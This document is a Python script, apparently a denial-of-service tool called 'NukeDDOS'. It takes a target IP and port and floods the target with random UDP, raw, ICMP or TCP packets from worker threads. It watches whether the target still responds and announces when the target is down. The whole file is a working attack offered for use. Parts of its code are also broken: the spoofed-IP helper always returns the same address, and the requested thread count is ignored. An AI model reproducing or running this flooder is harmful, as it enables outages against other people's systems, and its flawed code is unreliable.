#!/usr/bin/env python3
import os
import time
import socket
import random
import threading
import struct
import subprocess
from functools import partial
from itertools import cycle

# ======== OPTIMIZED CONFIGURATION ========
os.system("printf '\033c' && figlet -f slant NukeDDOS")  # Faster clear
print("Author   : Laila19\ngithub   : https://github.com/lailacypher\n")

# Input with validation
target_ip = input("Target IP : ").strip()
target_port = int(input("Port      : ").strip())
thread_count = min(int(input("Threads   : ").strip()), 1000)  # Built-in limit

# ======== MEMORY OPTIMIZATIONS ========
# Immutable tuple for packet types (cache-friendly)
PACKET_TYPES = (
    ("UDP", socket.SOCK_DGRAM),
    ("RAW", socket.SOCK_RAW),
    ("ICMP", socket.SOCK_RAW),
    ("TCP", socket.SOCK_STREAM)
)

# String pre-allocation
STRINGS = {
    'progress': "[%-30s] %d%%",
    'attack': "\rAttack Progress: |%-30s| %.1f%%",
    'target_down': "\n\nTarget is down! Stopping attack..."
}

# ======== OPTIMIZED CORE FUNCTIONS ========
def check_target(ip, port, attempts=3, timeout=1):
    """Ultra-optimized target status checker"""
    for _ in range(attempts):
        try:
            # Reusable socket context
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                if s.connect_ex((ip, port)) == 0:
                    return True
            
            # System-level ping call
            return subprocess.run(
                ['ping', '-c', '1', '-W', str(timeout), ip],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            ).returncode == 0
        except:
            continue
    return False

# Pre-computed IP generator
_random_ip = partial(socket.inet_ntoa, struct.pack('>I', random.randint(1, 0xffffffff)))

# ======== OPTIMIZED VISUALS ========
def show_progress(duration=3, message="", steps=30):
    """Zero-overhead progress bar"""
    print(f"\n{message}...")
    template = STRINGS['progress']
    for i in range(steps + 1):
        print(template % ('█'*i + '-'*(steps-i), (i*100)//steps), end='\r', flush=True)
        time.sleep(duration/steps)
    print()

# ======== OPTIMIZED ATTACK CORE ========
class AttackEngine:
    __slots__ = ['sent', 'running', 'target_up', 'completion', 'lock']  # Memory optimization
    
    def __init__(self):
        self.sent = 0
        self.running = True
        self.target_up = True
        self.completion = 0
        self.lock = threading.Lock()
    
    def attack(self, ip, port, packet_name, sock_type):
        """Optimized attack vector"""
        data = random._urandom(2048)
        target = (ip, port)
        proto = socket.IPPROTO_UDP if packet_name == "UDP" else 0
        
        while self.running and self.target_up:
            try:
                # Single socket per thread with reuse
                with socket.socket(socket.AF_INET, sock_type, proto) as sock:
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    
                    # Batch packet sending
                    packets = [
                        data[:512], data[512:1024],
                        data[1024:1536], data[1536:]
                    ]
                    
                    for _ in range(5):  # Batch send
                        for packet in packets:
                            try:
                                sock.sendto(packet + _random_ip().encode(), target)
                                with self.lock:
                                    self.sent += 1
                            except socket.error:
                                continue
            except Exception:
                continue

    def monitor(self, ip, port):
        """Intelligent target monitoring"""
        baseline = sum(check_target(ip, port, 1, 0.5) for _ in range(5)) / 5
        while self.running:
            current = sum(check_target(ip, port, 1, 0.5) for _ in range(5)) / 5
            self.completion = min(100, max(0, (1 - current/max(baseline, 0.01)) * 100))
            
            print(STRINGS['attack'] % (
                '█' * int(self.completion/3.33) + '-' * (30 - int(self.completion/3.33)),
                self.completion
            ), end='', flush=True)
            
            if current < 0.2:
                print(STRINGS['target_down'])
                self.target_up = False
                self.running = False
                self.completion = 100
                break
            time.sleep(5)

# ======== MAIN EXECUTION ========
if __name__ == "__main__":
    # Initial target verification
    if not check_target(target_ip, target_port):
        print(f"\nError: Target {target_ip}:{target_port} is not responding.")
        exit()

    # Packet selection
    print("\nSelect packet type:")
    for i, (name, _) in enumerate(PACKET_TYPES, 1):
        print(f"{i}. {name}")
    
    type_choice = int(input("Packet Type (1-4): ").strip()) - 1
    packet_name, sock_type = PACKET_TYPES[type_choice]

    # Startup sequence
    for msg in ["Initializing weapons", "Building payload", "Spawning threads"]:
        show_progress(1.5, msg)
    show_progress(1, "Launching attack")

    # Attack core
    engine = AttackEngine()
    
    # Attack threads
    threads = [
        threading.Thread(target=engine.attack, args=(target_ip, target_port, packet_name, sock_type)),
        threading.Thread(target=engine.monitor, args=(target_ip, target_port))
    ]
    
    for t in threads:
        t.daemon = True
        t.start()

    # Main control
    try:
        while engine.running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n\nStopping attack by user request...")
        engine.running = False

    # Cleanup
    for t in threads:
        t.join(1)

    print(f"\nAttack finished. Total packets sent: {engine.sent}")
    print(f"Final status: {'Target DOWN' if engine.completion >= 95 else 'Target still up'}")
